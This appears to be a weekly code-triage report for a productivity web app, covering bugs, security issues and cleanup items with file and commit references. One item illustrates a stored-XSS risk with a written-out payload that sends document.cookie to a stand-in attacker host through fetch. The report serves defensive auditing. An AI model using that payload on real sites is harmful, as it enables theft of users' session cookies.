# Weekly Triage — 2026-09-21

## 📊 Week at a glance
- **Commits**: 0 (last commit was 2026-09-12, 9 days ago)
- **Files changed this week**: 0
- **Debt markers added**: 0 (no new commits to scan)
- **High-churn files (last 30 days)**: `givelink.html` (touched in #84), `index.html` (touched in #84)

No commits landed in the trailing 7-day window. The items below are drawn from the most recent active work (commits `72e03fe` and `160f0d8`, merged 2026-09-12) plus standing issues discovered in the codebase audit.

---

## 🚨 Needs immediate attention

### 1. Claude API key uploaded to Supabase on every sync
- **File**: `index.html:10408`
- **Commit**: `0c1d32d` (Rebrand to Arete, the commit that added cloud sync)
- **Why this matters**: `sbPush()` serialises the entire `S` object including `S.claudeKey` to the `app_state` table. Anyone with DB access (Supabase dashboard, support, misconfigured RLS) can read user API keys. This is an Anthropic key exposure risk with direct billing consequences.

### 2. Push notification icons are 404 — reminders arrive iconless
- **File**: `sw.js:46-47`
- **Commit**: `199af7d` (Enable Supabase cloud sync in production) or earlier when push notifications were added
- **Why this matters**: `./icons/icon-192.png` does not exist (no `icons/` subdirectory). Every push reminder notification lands with a broken/missing icon. Users on Android/iOS see a blank notification badge. This is a regression against the stated PWA quality bar.

### 3. Task delete toast injects unescaped task title into `innerHTML`
- **File**: `index.html:3844`
- **Commit**: somewhere in the early task-management commits (pre #60)
- **Why this matters**: `toast(\`🗑 "<strong>${t.title.slice(0,30)}</strong>"...\`)` + `el.innerHTML=msg` at line 2789. A title of `<img src=x onerror=fetch('https://evil.com/'+document.cookie)>` executes on task delete. Currently self-XSS, but becomes stored XSS the moment shared task lists or exported data lands back in another user's browser.

### 4. `renderWizPanel()` weekly review wizard — three unescaped title injections
- **File**: `index.html:3594, 3601, 3603`
- **Commit**: `42c090d` or earlier (weekly review / wizard introduced)
- **Why this matters**: Same XSS vector as #3, triggered during the Weekly Review flow — the highest-engagement moment in the product.

---

## 🧹 Cleanup opportunities

### 5. Service worker cache key not bumped since July 23
- **File**: `sw.js:1` — `CACHE = 'arete-20260723'`
- **Commit**: `42775fc` (Bump service-worker cache to force PWA update, 2026-07-??)
- **Why this matters**: Bug fixes from #81 (brand consistency), #83 (landing SEO), #84 (givelink fixes) are invisible to any user who installed the PWA before that date. Two months of fixes silently unreachable.
- **Fix**: Change to `'arete-20260921'`; add cache-bump to deploy checklist.

### 6. `TODO`-class comment in `api/claude.js` — rate limiting never landed
- **File**: `api/claude.js:12`
- **Commit**: `199af7d` (Enable Supabase cloud sync in production, likely when the proxy was first added)
- **Why this matters**: _"Note: this is a minimal proxy. For production add per-user rate limiting (e.g. Upstash) so a single account can't run up your Anthropic bill."_ — this comment has been in the file since the proxy shipped. It is now a production system. The "for production" condition is satisfied; the work is not done.

### 7. `posthogKey: ''` — analytics have never been wired up
- **File**: `index.html:9960`
- **Commit**: `b38d4bb` (Landing growth: analytics, SEO foundation) introduced `posthogKey` as empty string
- **Why this matters**: Four PLG features shipped after this (templates, share card, referral, guest mode) with zero conversion data. No funnel, no retention, no insight into which acquisition channel works. Fixing this is a 1-line change.

### 8. Content pipeline edit loses `createdAt` — fixed in `72e03fe` but similar pattern in experiences
- **File**: `index.html:12654` — fixed. Check `index.html:12819` (saveExperience) — also fixed in same commit.
- **Commit**: `72e03fe`
- **Why this matters**: The pattern `if(editId){…obj,createdAt:undefined}` destroys the original `createdAt` on edit. Both were fixed in the last commit. Do a quick audit for the same spread pattern in `saveBook`, `saveWin`, `saveOKR`, `saveBiomarker` — these functions follow the same template and were not touched in `72e03fe`.

### 9. `_removePasteItem(i)` bounds-guard added but index is still index, not id
- **File**: `index.html:12542`
- **Commit**: `72e03fe`
- **Why this matters**: The guard `if(i<0||i>=_pasteItems.length)return` prevents a crash but not a wrong deletion if the UI re-renders between click and delete. The underlying design (keying by array index) is fragile. See IMPROVEMENT_PLAN.md item #14 for the fix.

---

## 🤔 Worth a second look

### 10. `sbSyncNow()` uses client-side `Date.now()` for conflict resolution
- **File**: `index.html:10417`
- **Commit**: `199af7d` or nearby (sync implementation)
- **Why this matters**: Last-write-wins keyed by `S._updatedAt = Date.now()`. If two devices have even a 1-second clock skew, the device with the ahead clock always wins and silently overwrites the other. This is survivable now (single user, mostly single device) but will become a data-loss bug the moment multi-device use increases. Worth a look before multi-user features land.

### 11. Givelink AI sprint section shows raw `e.message` on error
- **File**: `givelink.html:1219-1227`
- **Commit**: `72e03fe` (Givelink bug fixes)
- **Why this matters**: The error state renders `Error: ${esc(e.message||'Unknown error')}` — technically safe (uses `esc`) but exposes internal error messages (network failures, API errors, JSON parse errors) directly to the UI. A user-friendly "Couldn't load AI summary — try again" is better UX and leaks less.

### 12. New "This Week" view in Givelink has no empty state
- **File**: `givelink.html:625-690` (added in `72e03fe`)
- **Commit**: `72e03fe`
- **Why this matters**: `renderWeekPlan()` renders day columns correctly but if there are 0 sprint tasks, the grid still renders 7 empty day columns. No "No tasks scheduled this week" message. Low severity but visible to any user loading a fresh sprint.

### 13. Givelink bottom nav still routes to `week` but previously routed to `growth`
- **File**: `givelink.html:309` (changed in `72e03fe`)
- **Commit**: `72e03fe`
- **Why this matters**: The Growth pillar is now only accessible from the sidebar, not the bottom nav. On mobile, that means Growth is buried behind a swipe. Intentional product decision or accidental demotion? Worth a quick check.

---

_13 items total. The 🚨 section (items 1–4) are the ones most likely to create user-visible problems or security incidents before next sprint._
